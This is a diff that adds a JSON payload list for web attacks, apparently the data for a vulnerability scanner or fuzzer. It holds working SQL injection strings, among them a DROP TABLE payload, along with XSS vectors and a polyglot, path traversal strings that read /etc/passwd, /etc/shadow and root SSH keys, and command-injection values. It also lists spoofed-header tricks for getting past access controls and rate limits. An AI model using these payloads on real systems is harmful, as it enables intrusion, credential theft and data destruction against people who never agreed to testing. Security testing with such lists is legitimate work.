@@ -1,0 +1,38 @@
+{
+  "sqli": {
+    "simple": ["' OR '1'='1", "' OR 1=1--", "admin' --", "1' OR '1'='1' /*", "' UNION SELECT 1,2,3--", "' AND 1=1--", "' AND 1=2--", "' OR '1'='1' #", "admin'#", "1; DROP TABLE users--"],
+    "encoded": ["%27%20OR%20%271%27%3D%271", "%27%20OR%201%3D1--", "%55%4e%49%4f%4e%20%53%45%4c%45%43%54%20%31%2c%32%2c%33--"],
+    "bypass": ["/*!50000OR*/ 1=1", "\\' OR 1=1--", "'||1=1||'", "' oR 1=1--", "' Or 1=1--"],
+    "time_based": ["' OR SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' OR pg_sleep(5)--"]
+  },
+  "xss": {
+    "simple": ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "javascript:alert(1)", "\"><script>alert(1)</script>"],
+    "encoded": ["%3Cscript%3Ealert(1)%3C/script%3E", "&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;", "\\x3cscript\\x3ealert(1)\\x3c/script\\x3e"],
+    "bypass": ["<scr<script>ipt>alert(1)</scr</script>ipt>", "<ScRiPt>alert(1)</ScRiPt>", "<img src=x onerror=\u0061lert(1)>", "«script»alert(1)«/script»"],
+    "polyglot": ["jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"]
+  },
+  "lfi": {
+    "simple": ["../../../etc/passwd", "..\\..\\..\\windows\\win.ini", "../../../../etc/shadow", "/etc/passwd", "....//....//....//etc/passwd"],
+    "encoded": ["%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd", "..%252f..%252f..%252fetc/passwd"],
+    "bypass": ["..././..././..././etc/passwd", "..\\/..\\/..\\/etc/passwd", "/etc/passwd%00", "../../../../etc/passwd%00.png"]
+  },
+  "rce": {
+    "simple": ["; id", "| id", "`id`", "$(id)", "|| id", "& id", "; whoami", "| whoami"],
+    "encoded": ["%3B%20id", "%7C%20id", "%60id%60"],
+    "bypass": [";e cho id", "|/bin/cat /etc/passwd", "& ping -c 10 127.0.0.1 &"]
+  },
+  "header_injection": {
+    "crlf": ["%0d%0aX-Injected:%20true", "%0aX-Injected:%20true"],
+    "host": ["X-Forwarded-Host: evil.com", "X-Forwarded-For: 127.0.0.1"],
+    "referer_bypass": ["Referer: https://www.google.com", "X-Original-URL: /admin", "X-Rewrite-URL: /admin", "X-Custom-IP-Authorization: 127.0.0.1"]
+  },
+  "rate_limit_bypass": {
+    "headers": ["X-Forwarded-For", "X-Real-IP", "X-Originating-IP", "X-Remote-IP", "X-Client-IP", "X-Remote-Addr", "X-Forwarded", "Forwarded-For", "X-ProxyUser-Ip", "Client-IP", "True-Client-IP", "Cluster-Client-IP"],
+    "ip_spoofs": ["127.0.0.1", "10.0.0.1", "172.16.0.1", "192.168.1.1"]
+  },
+  "path_traversal": {
+    "windows": ["..\\..\\..\\boot.ini", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"],
+    "linux": ["../../../../etc/issue", "../../../../etc/shadow", "../../../../root/.ssh/id_rsa"],
+    "java": ["..\\..\\..\\..\\WEB-INF\\web.xml", "..\\..\\..\\..\\META-INF\\MANIFEST.MF"]
+  }
+}
